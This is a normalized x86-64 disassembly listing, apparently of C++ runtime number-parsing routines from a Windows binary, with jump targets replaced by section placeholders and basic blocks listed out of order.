mov rcx rdi
call sub_1400219d0
test al al
jne r-xdata
cmp eax 0x800
jne r-xdata
mov r12d ecx
jmp r-xdata
mov [ rsp + 0x30 ] 0x2d
xor eax eax
mov [ rsp + 0x3c ] ax
mov [ rsp + 0x44 ] eax
mov [ rsp + 0x20 ] rsi
lea r9 [ rsp + 0x44 ]
mov r8 r15
lea rdx [ rsp + 0x30 ]
lea rcx [ rsp + 0x3c ]
call sub_1400385a4
movzx ebx [ rsp + 0x3c ]
mov rcx rdi
call sub_1400212e0
cmp ax bx
jne r-xdata
mov [ r12 ] 0x2b
jmp r-xdata
neg eax
sbb r12d r12d
and r12d 0xa
mov r12d 0x10
jmp r-xdata
mov [ rsp + 0x44 ] r12d
xor bl bl
mov [ rsp + 0x38 ] bl
mov [ rsp + 0x3c ] bl
mov rdx r13
mov rcx rdi
call sub_1400219d0
test al al
jne r-xdata
mov [ r12 ] 0x2d
lea r14 [ r12 + 0x1 ]
mov rcx rdi
call sub_140021350
test r12d r12d
je r-xdata
mov rcx rdi
call sub_1400212e0
cmp ax [ rsp + 0x40 ]
jne r-xdata
mov esi 0xa
cmp r12d 0xa
je r-xdata
movzx ebx r15b
mov [ rsp + 0x38 ] bl
mov rcx rdi
call sub_140021350
mov rdx r13
mov rcx rdi
call sub_1400219d0
test al al
jne r-xdata
movzx eax [ rsp + 0x38 ]
movsxd rsi esi
mov [ rbp - 0x71 ] rsi
mov eax 0x8
test r12d r12d
jne r-xdata
mov [ rsp + 0x30 ] 0x78
xor eax eax
mov [ rsp + 0x40 ] ax
mov [ rsp + 0x48 ] eax
mov [ rsp + 0x20 ] rsi
lea r9 [ rsp + 0x48 ]
mov r8 r15
lea rdx [ rsp + 0x30 ]
lea rcx [ rsp + 0x40 ]
call sub_1400385a4
movzx ebx [ rsp + 0x40 ]
mov rcx rdi
call sub_1400212e0
cmp ax bx
je r-xdata
mov r14 [ rbp - 0x79 ]
test rbx rbx
je r-xdata
mov [ rsp + 0x30 ] 0x0
mov [ rsp + 0x48 ] 0x0
mov r9 [ rbp - 0x69 ]
lea r8 [ rsp + 0x48 ]
movzx edx [ rdi + 0xa ]
lea rcx [ rsp + 0x30 ]
call sub_1400379dc
movsx r11d [ rsp + 0x30 ]
mov [ r14 ] r11b
mov edx r11d
mov r8 rsi
lea rcx [ r--data ]
call sub_14003b840
test rax rax
je r-xdata
mov rcx [ rdi ]
test rcx rcx
je r-xdata
mov r12d 0xf
mov [ rbp - 0x39 ] r12
mov [ rbp - 0x51 ] bl
mov [ rbp - 0x41 ] r15
mov [ rbp - 0x50 ] 0x0
xor ebx ebx
mov rdx r13
mov rcx rdi
call sub_1400219d0
mov r13 [ rbp - 0x51 ]
test al al
jne r-xdata
mov eax 0x8
mov r12d eax
mov [ rsp + 0x44 ] eax
jmp r-xdata
test r12d r12d
je r-xdata
mov [ rsp + 0x30 ] 0x58
xor eax eax
mov [ rsp + 0x40 ] ax
mov [ rsp + 0x48 ] eax
mov [ rsp + 0x20 ] rsi
lea r9 [ rsp + 0x48 ]
mov r8 r15
lea rdx [ rsp + 0x30 ]
lea rcx [ rsp + 0x40 ]
call sub_1400385a4
movzx ebx [ rsp + 0x40 ]
mov rcx rdi
call sub_1400212e0
cmp ax bx
jne r-xdata
cmp r8 0x10
jb r-xdata
mov rcx r13
call j_sub_14003ad04
mov r8 [ rbp - 0x11 ]
mov r9 [ rbp - 0x29 ]
cmp [ rsp + 0x3c ] 0x0
jne r-xdata
movzx ecx [ rdx ]
cmp cl 0x7f
je r-xdata
lea rax [ rbp - 0x51 ]
cmp r12 0x10
cmovae rax r13
cmp [ rax + rbx ] 0x0
je r-xdata
cmp [ rsp + 0x3c ] 0x0
jne r-xdata
mov [ rdi ] 0x0
mov rdx [ rcx + 0x40 ]
cmp [ rdx ] 0x0
je r-xdata
mov esi 0x16
cmp r12d 0x8
cmove esi eax
jmp r-xdata
mov r12d 0x10
mov [ rsp + 0x44 ] r12d
xor bl bl
mov [ rsp + 0x38 ] bl
mov rcx rdi
call sub_140021350
jmp r-xdata
cmp r12d 0x10
jne r-xdata
movzx ebx r15b
mov eax [ rsp + 0x44 ]
mov rcx [ rbp - 0x1 ]
xor rcx rsp
call sub_14003a6a0
add rsp 0xd8
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbx
pop rbp
retn
mov rcx r9
call j_sub_14003ad04
mov [ r14 ] 0x0
cmp r12 0x10
jb r-xdata
mov [ r14 ] 0x30
inc r14
jmp r-xdata
dec rbx
je r-xdata
test rbx rbx
je r-xdata
movzx esi [ rbp - 0x7d ]
test si si
je r-xdata
mov rax [ rbp - 0x79 ]
add rax 0x1f
cmp r14 rax
jae r-xdata
cmp [ r14 ] 0x30
je r-xdata
mov rax [ rcx ]
call [ rax + 0x30 ]
mov rax [ rcx + 0x58 ]
cmp [ rax ] 0x0
jle r-xdata
test rbx rbx
jne r-xdata
lea rax [ rbp - 0x51 ]
cmp r12 0x10
cmovae rax r13
cmp cl [ rax + rbx ]
jne r-xdata
lea rax [ rbp - 0x51 ]
cmp r12 0x10
cmovae rax r13
cmp [ rax + rbx ] 0x0
jle r-xdata
mov rcx rdi
call sub_1400212e0
cmp ax si
jne r-xdata
mov [ rsp + 0x38 ] 0x1
lea rax [ rbp - 0x51 ]
cmp r12 0x10
cmovae rax r13
cmp [ rax + rbx ] 0x7f
je r-xdata
inc r14
mov [ rsp + 0x3c ] 0x1
mov [ rdi + 0xa ] ax
jmp r-xdata
mov rax [ rdx ]
movzx eax [ rax ]
jmp r-xdata
cmp [ rdx + 0x1 ] 0x0
jle r-xdata
lea rax [ rbp - 0x51 ]
cmp r12 0x10
cmovae rax r13
cmp cl [ rax ]
jl r-xdata
xor al al
jmp r-xdata
inc rbx
jmp r-xdata
or rax 0xffffffffffffffff
sub rax r15
cmp rax 0x1
jbe r-xdata
mov rcx [ rdi ]
test rcx rcx
je r-xdata
lea rax [ rbp - 0x51 ]
cmp r12 0x10
cmovae rax r13
inc [ rax + rbx ]
mov r12 [ rbp - 0x39 ]
mov r15 [ rbp - 0x41 ]
mov r13 [ rbp - 0x51 ]
jmp r-xdata
mov [ rdi + 0x8 ] 0x1
mov ecx 0xffff
cmp cx ax
je r-xdata
inc rdx
jmp r-xdata
lea rdx [ rbp - 0x29 ]
mov r9 [ rbp - 0x29 ]
mov r8 [ rbp - 0x11 ]
cmp r8 0x10
cmovae rdx r9
test al al
je r-xdata
lea rcx [ r--data ]
call sub_1400378ec
lea rsi [ r15 + 0x1 ]
cmp rsi 0xfffffffffffffffe
ja r-xdata
mov [ rdi ] 0x0
mov [ rdi + 0x8 ] 0x1
mov rax [ rcx + 0x40 ]
cmp [ rax ] 0x0
je r-xdata
lea rcx [ r--data ]
call sub_1400378ec
cmp r12 rsi
jae r-xdata
cmp [ rdi + 0x8 ] 0x0
jne r-xdata
jmp r-xdata
mov rax [ rcx ]
call [ rax + 0x38 ]
mov rax [ rcx + 0x58 ]
cmp [ rax ] 0x0
jle r-xdata
test rsi rsi
jne r-xdata
mov r8 r15
mov rdx rsi
lea rcx [ rbp - 0x51 ]
call sub_1400061b0
jmp r-xdata
mov [ rdi + 0x8 ] 0x0
jmp r-xdata
dec [ rax ]
mov rcx [ rcx + 0x40 ]
mov rdx [ rcx ]
lea rax [ rdx + 0x2 ]
mov [ rcx ] rax
movzx eax [ rdx ]
jmp r-xdata
setne al
test al al
je r-xdata
mov [ rbp - 0x41 ] rsi
lea rax [ rbp - 0x51 ]
cmp r12 0x10
cmovae rax r13
mov [ rax ] sil
mov r13 [ rbp - 0x51 ]
mov r15 [ rbp - 0x41 ]
mov r12 [ rbp - 0x39 ]
test rsi rsi
mov rdx [ rbp - 0x61 ]
mov rcx rdi
call sub_1400219d0
test al al
je r-xdata
mov ecx 0xffff
cmp cx ax
je r-xdata
inc rbx
mov rsi [ rbp - 0x71 ]
lea rax [ rbp - 0x51 ]
cmp r12 0x10
cmovae rax r13
mov [ rax + r15 ] 0x0
mov [ rbp - 0x41 ] rsi
lea rax [ rbp - 0x51 ]
cmp [ rbp - 0x39 ] 0x10
cmovae rax [ rbp - 0x51 ]
mov [ rsi + rax ] 0x0
mov r12 [ rbp - 0x39 ]
mov r15 [ rbp - 0x41 ]
mov r13 [ rbp - 0x51 ]
sub_14001f2e0
push rbp
push rbx
push rsi
push rdi
push r12
push r13
push r14
push r15
lea rbp [ rsp - 0xf ]
sub rsp 0xe8
mov [ rbp - 0x59 ] 0xfffffffffffffffe
mov rax [ rw-data ]
xor rax rsp
mov [ rbp - 0x1 ] rax
mov r14 r9
mov [ rsp + 0x58 ] r9
mov rdi r8
mov [ rbp - 0x69 ] rdx
mov r12 rcx
mov rcx [ rbp + 0x77 ]
mov r8 [ rbp + 0x7f ]
mov eax [ rcx + 0x18 ]
and eax 0x3000
cmp eax 0x3000
jne r-xdata
lea rdx [ rbp - 0x61 ]
call sub_140003240
nop
mov rcx rax
call sub_14000b210
mov r13 rax
mov [ rbp - 0x71 ] rax
xor r15d r15d
mov rsi [ rbp - 0x61 ]
test rsi rsi
je r-xdata
mov [ rsp + 0x28 ] r8
mov [ rsp + 0x20 ] rcx
mov r8 rdi
mov rcx r12
call sub_140020200
jmp r-xdata
lea rdx [ rbp - 0x29 ]
mov rcx r13
call sub_14002b150
nop
mov [ rsp + 0x40 ] 0x30
mov [ rsp + 0x38 ] r15w
mov [ rsp + 0x4c ] r15d
lea r15 [ r12 + 0x10 ]
mov [ rbp - 0x79 ] r15
mov [ rsp + 0x20 ] r15
lea r9 [ rsp + 0x4c ]
mov r8d 0x1
lea rdx [ rsp + 0x40 ]
lea rcx [ rsp + 0x38 ]
call sub_1400385a4
mov rsi [ rbp - 0x69 ]
mov rbx rsi
mov [ rsp + 0x50 ] rbx
mov [ rsp + 0x40 ] 0x0
mov rdx r14
mov rcx rdi
call sub_1400219d0
xor r12d r12d
test al al
jne r-xdata
xor edx edx
lea rcx [ rsp + 0x4c ]
call sub_14003825c
mov rax [ rsi + 0x8 ]
test rax rax
je r-xdata
mov rcx [ rbp - 0x1 ]
xor rcx rsp
call sub_14003a6a0
add rsp 0xe8
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbx
pop rbp
retn
xor r14b r14b
mov [ rsp + 0x30 ] r14b
mov esi r12d
mov [ rsp + 0x48 ] r12d
mov [ rsp + 0x4c ] r12d
lea rax [ rbp - 0x29 ]
mov rcx [ rbp - 0x29 ]
mov rdx [ rbp - 0x11 ]
cmp rdx 0x10
cmovae rax rcx
cmp [ rax ] 0x7f
je r-xdata
mov [ rsp + 0x30 ] 0x2b
mov [ rsp + 0x48 ] r12w
mov [ rsp + 0x4c ] r12d
mov [ rsp + 0x20 ] r15
lea r9 [ rsp + 0x4c ]
lea r8d [ r12 + 0x1 ]
lea rdx [ rsp + 0x30 ]
lea rcx [ rsp + 0x48 ]
call sub_1400385a4
movzx ebx [ rsp + 0x48 ]
mov rcx rdi
call sub_1400212e0
cmp ax bx
jne r-xdata
mov rbx r15
cmp [ rsi + 0x8 ] rbx
cmove rbx rsi
lea rcx [ rsp + 0x4c ]
call sub_14003828c
test rbx rbx
je r-xdata
cmp rax 0xffffffffffffffff
jae r-xdata
mov rdx [ rsp + 0x58 ]
mov rcx rdi
call sub_1400219d0
test al al
jne r-xdata
lea rax [ rbp - 0x29 ]
cmp rdx 0x10
cmovae rax rcx
cmp [ rax ] r14b
jle r-xdata
mov [ rsp + 0x30 ] 0x2d
mov [ rsp + 0x48 ] r12w
mov [ rsp + 0x4c ] r12d
mov [ rsp + 0x20 ] r15
lea r9 [ rsp + 0x4c ]
mov r8d 0x1
lea rdx [ rsp + 0x30 ]
lea rcx [ rsp + 0x48 ]
call sub_1400385a4
movzx ebx [ rsp + 0x48 ]
mov rcx rdi
call sub_1400212e0
cmp ax bx
jne r-xdata
mov [ rsi ] 0x2b
mov rax [ rbx ]
mov edx 0x1
mov rcx rbx
call [ rax ]
dec rax
mov [ rsi + 0x8 ] rax
mov r12 [ rsp + 0x50 ]
movzx r12d [ rsp + 0x38 ]
nop [ rax + rax ] eax
cmp [ rbp - 0x19 ] 0x0
jne r-xdata
mov rbx rsi
mov [ rsi ] 0x2d
jmp r-xdata
xor r13d r13d
cmp [ rdi + 0x8 ] al
jne r-xdata
cmp r12w [ rdi + 0xa ]
ja r-xdata
mov rcx [ rdi ]
test rcx rcx
je r-xdata
mov rax [ r13 ]
mov rcx r13
call [ rax + 0x10 ]
movzx r15d ax
movzx r15d r12w
jmp r-xdata
lea rbx [ rsi + 0x1 ]
mov [ rsp + 0x50 ] rbx
mov rcx rdi
call sub_140021350
jmp r-xdata
mov rdx rbx
mov rcx rdi
call sub_1400219d0
movzx r13d [ rsp + 0x38 ]
test al al
jne r-xdata
mov rdx rbx
mov rcx rdi
call sub_1400219d0
test al al
jne r-xdata
movzx ebx [ rdi + 0xa ]
mov rax [ r13 ]
mov rcx r13
call [ rax + 0x8 ]
cmp bx ax
jne r-xdata
mov rcx [ rdi ]
test rcx rcx
je r-xdata
test r14b r14b
je r-xdata
mov rcx rdi
call sub_1400212e0
movzx r11d ax
movzx eax r12w
add eax 0x9
cmp r11d eax
jg r-xdata
mov [ rdi ] 0x0
mov rdx [ rcx + 0x40 ]
cmp [ rdx ] 0x0
je r-xdata
lea rdx [ rbp - 0x29 ]
cmp [ rbp - 0x11 ] 0x10
cmovae rdx [ rbp - 0x29 ]
cmp [ rsp + 0x40 ] 0x0
jne r-xdata
mov rcx rdi
call sub_1400212e0
cmp [ rsp + 0x38 ] ax
ja r-xdata
mov r12d 0xf
mov [ rbp - 0x39 ] r12
mov r14d 0x1
mov [ rbp - 0x41 ] r14
mov [ rbp - 0x51 ] 0x0
xor ebx ebx
mov rdx [ rsp + 0x58 ]
mov rcx rdi
call sub_1400219d0
mov r13 [ rbp - 0x51 ]
test al al
jne r-xdata
test r14b r14b
je r-xdata
cmp [ rdi + 0x8 ] 0x0
jne r-xdata
mov eax [ rsp + 0x4c ]
test eax eax
jns r-xdata
movzx esi [ rsp + 0x38 ]
mov r15d [ rsp + 0x4c ]
mov r12d 0xffff
mov rbx [ rsp + 0x58 ]
call sub_14003b85c
mov rcx [ rax ]
movzx eax [ rcx ]
mov [ r12 ] al
inc r12
mov [ rsp + 0x50 ] r12
mov rcx [ rdi ]
test rcx rcx
je r-xdata
mov [ rdi ] 0x0
mov rdx [ rcx + 0x40 ]
cmp [ rdx ] 0x0
je r-xdata
mov r12 [ rsp + 0x50 ]
test esi esi
jne r-xdata
cmp esi 0x24
jl r-xdata
mov rax [ rcx ]
call [ rax + 0x30 ]
mov rax [ rcx + 0x58 ]
cmp [ rax ] 0x0
jle r-xdata
cmp r12 0x10
jb r-xdata
test rbx rbx
je r-xdata
lea rax [ rbp - 0x51 ]
cmp r12 0x10
cmovae rax r13
cmp [ rax + rbx ] 0x0
je r-xdata
mov rcx rdi
call sub_1400212e0
movzx r11d ax
movzx eax [ rsp + 0x38 ]
add eax 0x9
cmp r11d eax
jg r-xdata
cmp [ rsp + 0x40 ] 0x0
jne r-xdata
mov rdx rbx
mov rcx rdi
call sub_1400219d0
test al al
jne r-xdata
cmp r13w [ rdi + 0xa ]
ja r-xdata
mov rcx [ rdi ]
test rcx rcx
je r-xdata
mov [ r12 ] 0x30
inc r12
inc eax
mov [ rsp + 0x4c ] eax
cmp [ rdi + 0xa ] si
jne r-xdata
mov rcx [ rdi ]
test rcx rcx
je r-xdata
xor r13d r13d
mov [ rdi ] r13
mov [ rdi + 0x8 ] 0x1
mov rbx [ rsp + 0x58 ]
jmp r-xdata
mov rax [ rcx + 0x40 ]
cmp [ rax ] 0x0
je r-xdata
mov rax [ rcx ]
call [ rax + 0x30 ]
mov rax [ rcx + 0x58 ]
cmp [ rax ] 0x0
jle r-xdata
mov rbx [ rsp + 0x58 ]
mov rdx rbx
mov rcx rdi
call sub_1400219d0
test al al
jne r-xdata
mov [ r12 ] 0x30
inc r12
mov [ rsp + 0x50 ] r12
jmp r-xdata
mov rcx rdi
call sub_1400212e0
cmp ax r12w
jne r-xdata
inc [ rsp + 0x4c ]
jmp r-xdata
mov [ rdi + 0xa ] ax
jmp r-xdata
mov rax [ rdx ]
movzx eax [ rax ]
jmp r-xdata
mov r15 [ rbp - 0x79 ]
movzx r14d [ rsp + 0x30 ]
mov r13 [ rbp - 0x71 ]
mov rcx r13
call j_sub_14003ad04
jmp r-xdata
movzx ecx [ rdx ]
cmp cl 0x7f
je r-xdata
test rbx rbx
je r-xdata
test r15w r15w
je r-xdata
mov [ rsp + 0x30 ] 0x1
cmp esi 0x24
jl r-xdata
mov r12 [ rbp - 0x69 ]
movzx eax [ rsp + 0x30 ]
test al al
jne r-xdata
cmp [ rdi + 0x8 ] al
jne r-xdata
cmp [ rdi + 0x8 ] 0x0
jne r-xdata
mov [ rdi ] 0x0
mov rdx [ rcx + 0x40 ]
cmp [ rdx ] 0x0
je r-xdata
mov [ rsp + 0x4c ] r15d
mov [ rsp + 0x30 ] r14b
mov esi [ rsp + 0x48 ]
mov r12 [ rsp + 0x50 ]
mov r15 [ rbp - 0x79 ]
dec r15d
mov r14b 0x1
mov rcx [ rdi ]
test rcx rcx
je r-xdata
mov [ rdi ] r13
mov rdx [ rcx + 0x40 ]
cmp [ rdx ] 0x0
je r-xdata
test esi esi
jne r-xdata
mov rax [ rcx ]
call [ rax + 0x38 ]
mov rax [ rcx + 0x58 ]
cmp [ rax ] 0x0
jle r-xdata
mov [ rdi + 0xa ] ax
jmp r-xdata
mov rax [ rdx ]
movzx eax [ rax ]
jmp r-xdata
mov rcx rdi
call sub_1400212e0
mov ecx 0x30
sub cl r12b
add al cl
mov [ rbx ] al
inc rbx
mov [ rsp + 0x50 ] rbx
inc esi
mov [ rsp + 0x48 ] esi
test esi esi
je r-xdata
mov r14b 0x1
mov [ rsp + 0x30 ] r14b
mov rcx rdi
call sub_140021350
mov rdx [ rsp + 0x58 ]
mov rcx rdi
call sub_1400219d0
test al al
je r-xdata
mov [ rdi + 0x8 ] 0x1
mov ecx 0xffff
cmp cx ax
je r-xdata
dec rbx
je r-xdata
lea rax [ rbp - 0x51 ]
cmp r12 0x10
cmovae rax r13
cmp [ rax + rbx ] 0x0
jle r-xdata
mov rcx rdi
call sub_1400212e0
cmp ax r15w
jne r-xdata
mov rcx rdi
call sub_1400212e0
cmp ax [ rsp + 0x38 ]
jne r-xdata
inc [ rsp + 0x4c ]
jmp r-xdata
mov eax [ rsp + 0x4c ]
mov rcx [ rbp - 0x29 ]
call j_sub_14003ad04
mov [ r12 ] 0x0
cmp [ rbp - 0x11 ] 0x10
jb r-xdata
movzx ebx [ rdi + 0xa ]
mov [ rsp + 0x38 ] 0x65
xor esi esi
mov [ rsp + 0x48 ] si
mov [ rsp + 0x50 ] esi
mov [ rsp + 0x20 ] r15
lea r9 [ rsp + 0x50 ]
lea r8d [ rsi + 0x1 ]
lea rdx [ rsp + 0x38 ]
lea rcx [ rsp + 0x48 ]
call sub_1400385a4
cmp bx [ rsp + 0x48 ]
je r-xdata
mov rcx [ rdi ]
test rcx rcx
je r-xdata
movzx ecx r13w
add ecx 0x9
movzx eax [ rdi + 0xa ]
cmp eax ecx
jg r-xdata
mov rcx [ rdi ]
test rcx rcx
je r-xdata
mov rax [ rcx ]
call [ rax + 0x30 ]
mov rax [ rcx + 0x58 ]
cmp [ rax ] 0x0
jle r-xdata
mov [ rdi ] r13
mov [ rdi + 0x8 ] 0x1
mov rax [ rcx + 0x40 ]
cmp [ rax ] 0x0
je r-xdata
mov rax [ rcx ]
call [ rax + 0x30 ]
mov rax [ rcx + 0x58 ]
cmp [ rax ] 0x0
jle r-xdata
mov [ rdi + 0x8 ] 0x0
jmp r-xdata
dec [ rax ]
mov rcx [ rcx + 0x40 ]
mov rdx [ rcx ]
lea rax [ rdx + 0x2 ]
mov [ rcx ] rax
movzx eax [ rdx ]
jmp r-xdata
mov [ rdi + 0x8 ] 0x1
mov ecx 0xffff
cmp cx ax
je r-xdata
cmp [ rdi + 0x8 ] 0x0
jne r-xdata
jmp r-xdata
test rbx rbx
jne r-xdata
lea rax [ rbp - 0x51 ]
cmp r12 0x10
cmovae rax r13
cmp cl [ rax + rbx ]
jne r-xdata
mov [ rsp + 0x40 ] 0x1
inc rbx
jmp r-xdata
or rax 0xffffffffffffffff
sub rax r14
cmp rax 0x1
jbe r-xdata
mov rcx rdi
call sub_1400212e0
mov ecx 0x30
sub cl [ rsp + 0x38 ]
add al cl
mov rcx [ rsp + 0x50 ]
mov [ rcx ] al
inc rcx
mov [ rsp + 0x50 ] rcx
inc esi
mov [ rsp + 0x48 ] esi
test esi esi
je r-xdata
lea rax [ rbp - 0x51 ]
cmp r12 0x10
cmovae rax r13
cmp [ rax + rbx ] 0x7f
je r-xdata
mov [ r12 ] 0x65
inc r12
mov rcx [ rdi ]
test rcx rcx
je r-xdata
cmp [ rdi + 0x8 ] sil
jne r-xdata
mov [ rdi ] 0x0
mov rdx [ rcx + 0x40 ]
cmp [ rdx ] 0x0
je r-xdata
cmp esi 0x24
jge r-xdata
mov [ rdi ] 0x0
mov rdx [ rcx + 0x40 ]
cmp [ rdx ] 0x0
je r-xdata
mov [ rdi + 0xa ] ax
jmp r-xdata
mov rax [ rdx ]
movzx eax [ rax ]
jmp r-xdata
cmp [ rdi + 0x8 ] 0x0
jne r-xdata
mov rax [ rcx ]
call [ rax + 0x38 ]
mov rax [ rcx + 0x58 ]
cmp [ rax ] 0x0
jle r-xdata
mov [ rdi + 0xa ] ax
jmp r-xdata
mov rax [ rdx ]
movzx eax [ rax ]
jmp r-xdata
mov ecx 0xffff
cmp cx ax
je r-xdata
cmp [ rdx + 0x1 ] 0x0
jle r-xdata
lea rax [ rbp - 0x51 ]
cmp r12 0x10
cmovae rax r13
cmp cl [ rax ]
jl r-xdata
mov [ rsp + 0x40 ] 0x1
lea rcx [ r--data ]
call sub_1400378ec
lea rsi [ r14 + 0x1 ]
cmp rsi 0xfffffffffffffffe
ja r-xdata
mov rcx rdi
call sub_140021350
mov rdx [ rsp + 0x58 ]
mov rcx rdi
call sub_1400219d0
test al al
je r-xdata
lea rax [ rbp - 0x51 ]
cmp r12 0x10
cmovae rax r13
inc [ rax + rbx ]
mov r12 [ rbp - 0x39 ]
mov r14 [ rbp - 0x41 ]
mov r13 [ rbp - 0x51 ]
jmp r-xdata
mov [ rdi ] rsi
mov [ rdi + 0x8 ] 0x1
mov rax [ rcx + 0x40 ]
cmp [ rax ] rsi
je r-xdata
movzx ebx [ rdi + 0xa ]
mov [ rsp + 0x38 ] 0x45
mov [ rsp + 0x48 ] si
mov [ rsp + 0x50 ] esi
mov [ rsp + 0x20 ] r15
lea r9 [ rsp + 0x50 ]
mov r8d 0x1
lea rdx [ rsp + 0x38 ]
lea rcx [ rsp + 0x48 ]
call sub_1400385a4
cmp bx [ rsp + 0x48 ]
jne r-xdata
mov rcx [ rdi ]
test rcx rcx
je r-xdata
mov rax [ rcx ]
call [ rax + 0x30 ]
mov rax [ rcx + 0x58 ]
cmp [ rax ] 0x0
jle r-xdata
mov r14b 0x1
mov [ rsp + 0x30 ] r14b
mov rcx [ rdi ]
test rcx rcx
je r-xdata
cmp [ rdi + 0x8 ] 0x0
jne r-xdata
mov rax [ rcx ]
call [ rax + 0x30 ]
mov rax [ rcx + 0x58 ]
cmp [ rax ] 0x0
jle r-xdata
mov [ rdi + 0x8 ] 0x1
mov ecx 0xffff
cmp cx ax
je r-xdata
mov [ rdi + 0x8 ] 0x0
jmp r-xdata
dec [ rax ]
mov rcx [ rcx + 0x40 ]
mov rdx [ rcx ]
lea rax [ rdx + 0x2 ]
mov [ rcx ] rax
movzx eax [ rdx ]
jmp r-xdata
mov [ rdi + 0x8 ] 0x1
cmp r12w ax
je r-xdata
inc rdx
jmp r-xdata
lea rcx [ r--data ]
call sub_1400378ec
cmp r12 rsi
jae r-xdata
jmp r-xdata
xor r15d r15d
cmp [ rdi + 0x8 ] sil
jne r-xdata
mov rax [ rcx ]
call [ rax + 0x38 ]
mov rax [ rcx + 0x58 ]
cmp [ rax ] esi
jle r-xdata
mov [ rdi ] rsi
mov rdx [ rcx + 0x40 ]
cmp [ rdx ] rsi
je r-xdata
mov [ rdi + 0xa ] ax
jmp r-xdata
mov rax [ rdx ]
movzx eax [ rax ]
jmp r-xdata
mov [ rdi ] 0x0
mov [ rdi + 0x8 ] 0x1
mov rax [ rcx + 0x40 ]
cmp [ rax ] 0x0
je r-xdata
movzx eax [ rdi + 0xa ]
sub al r13b
add al 0x30
mov [ r12 ] al
inc r12
inc esi
mov rcx [ rdi ]
test rcx rcx
je r-xdata
mov [ rdi + 0xa ] ax
jmp r-xdata
mov rax [ rdx ]
movzx eax [ rax ]
jmp r-xdata
mov rdx rbx
mov rcx rdi
call sub_1400219d0
test al al
je r-xdata
cmp r12w ax
je r-xdata
test rsi rsi
jne r-xdata
mov r8 r14
mov rdx rsi
lea rcx [ rbp - 0x51 ]
call sub_1400061b0
jmp r-xdata
mov rdx r14
mov rcx rdi
call sub_1400219d0
test al al
jne r-xdata
nop [ rax ] eax
movzx ebx [ rdi + 0xa ]
mov [ rsp + 0x38 ] 0x2b
xor eax eax
mov [ rsp + 0x48 ] ax
mov [ rsp + 0x50 ] eax
mov [ rsp + 0x20 ] r15
lea r9 [ rsp + 0x50 ]
lea r8d [ rax + 0x1 ]
lea rdx [ rsp + 0x38 ]
lea rcx [ rsp + 0x48 ]
call sub_1400385a4
cmp bx [ rsp + 0x48 ]
jne r-xdata
mov rcx [ rdi ]
test rcx rcx
je r-xdata
mov [ rdi + 0x8 ] sil
jmp r-xdata
dec [ rax ]
mov rcx [ rcx + 0x40 ]
mov rdx [ rcx ]
lea rax [ rdx + 0x2 ]
mov [ rcx ] rax
movzx eax [ rdx ]
jmp r-xdata
mov rax [ rcx ]
call [ rax + 0x30 ]
mov rax [ rcx + 0x58 ]
cmp [ rax ] esi
jle r-xdata
mov [ rdi + 0x8 ] 0x1
mov ecx 0xffff
cmp cx ax
je r-xdata
jmp r-xdata
mov rax [ rcx ]
call [ rax + 0x38 ]
mov rax [ rcx + 0x58 ]
cmp [ rax ] 0x0
jle r-xdata
mov [ rdi ] 0x0
mov rdx [ rcx + 0x40 ]
cmp [ rdx ] 0x0
je r-xdata
mov [ rdi + 0x8 ] 0x1
mov ecx 0xffff
cmp cx ax
je r-xdata
setne al
test al al
je r-xdata
mov [ rbp - 0x41 ] rsi
lea rax [ rbp - 0x51 ]
cmp r12 0x10
cmovae rax r13
mov [ rax ] sil
mov r13 [ rbp - 0x51 ]
mov r14 [ rbp - 0x41 ]
mov r12 [ rbp - 0x39 ]
test rsi rsi
cmp [ rdi + 0x8 ] 0x0
jne r-xdata
cmp [ rdi + 0xa ] r13w
jne r-xdata
mov rcx [ rdi ]
test rcx rcx
je r-xdata
cmp [ rdi + 0x8 ] sil
jne r-xdata
mov [ r12 ] 0x2b
xor eax eax
mov [ rdi ] rax
mov rdx [ rcx + 0x40 ]
cmp [ rdx ] rsi
je r-xdata
xor bl bl
mov [ rsp + 0x30 ] bl
mov r14 [ rsp + 0x58 ]
mov rdx r14
mov rcx rdi
call sub_1400219d0
test al al
jne r-xdata
mov ecx 0xffff
cmp cx ax
je r-xdata
mov [ rdi + 0xa ] ax
jmp r-xdata
mov rax [ rdx ]
movzx eax [ rax ]
jmp r-xdata
mov [ rdi + 0x8 ] 0x0
jmp r-xdata
dec [ rax ]
mov rcx [ rcx + 0x40 ]
mov rdx [ rcx ]
lea rax [ rdx + 0x2 ]
mov [ rcx ] rax
movzx eax [ rdx ]
jmp r-xdata
mov rax [ rcx ]
call [ rax + 0x30 ]
mov rax [ rcx + 0x58 ]
cmp [ rax ] 0x0
jle r-xdata
inc rbx
mov esi [ rsp + 0x48 ]
lea rax [ rbp - 0x51 ]
cmp r12 0x10
cmovae rax r13
mov [ rax + r14 ] 0x0
mov [ rbp - 0x41 ] rsi
lea rax [ rbp - 0x51 ]
cmp [ rbp - 0x39 ] 0x10
cmovae rax [ rbp - 0x51 ]
mov [ rsi + rax ] 0x0
mov r12 [ rbp - 0x39 ]
mov r14 [ rbp - 0x41 ]
mov r13 [ rbp - 0x51 ]
cmp r13w [ rdi + 0xa ]
ja r-xdata
mov rcx [ rdi ]
test rcx rcx
je r-xdata
test bl bl
je r-xdata
mov bl 0x1
mov [ rsp + 0x30 ] bl
mov rcx [ rdi ]
test rcx rcx
je r-xdata
mov [ rdi ] r15
mov rdx [ rcx + 0x40 ]
cmp [ rdx ] rsi
je r-xdata
movzx ebx [ rdi + 0xa ]
mov [ rsp + 0x38 ] 0x2d
xor eax eax
mov [ rsp + 0x48 ] ax
mov [ rsp + 0x50 ] eax
mov [ rsp + 0x20 ] r15
lea r9 [ rsp + 0x50 ]
lea r8d [ rax + 0x1 ]
lea rdx [ rsp + 0x38 ]
lea rcx [ rsp + 0x48 ]
call sub_1400385a4
cmp bx [ rsp + 0x48 ]
jne r-xdata
mov rcx [ rdi ]
test rcx rcx
je r-xdata
xor r15d r15d
mov [ rdi ] r15
mov [ rdi + 0x8 ] 0x1
movzx ebx sil
jmp r-xdata
mov rax [ rcx + 0x40 ]
cmp [ rax ] rsi
je r-xdata
mov rax [ rcx ]
call [ rax + 0x30 ]
mov rax [ rcx + 0x58 ]
cmp [ rax ] esi
jle r-xdata
mov [ rdi + 0x8 ] 0x1
mov ecx 0xffff
cmp cx ax
je r-xdata
mov rdx rbx
mov rcx rdi
call sub_1400219d0
test al al
je r-xdata
mov ecx 0xffff
cmp cx ax
je r-xdata
mov [ rdi + 0xa ] ax
jmp r-xdata
mov rax [ rdx ]
movzx eax [ rax ]
jmp r-xdata
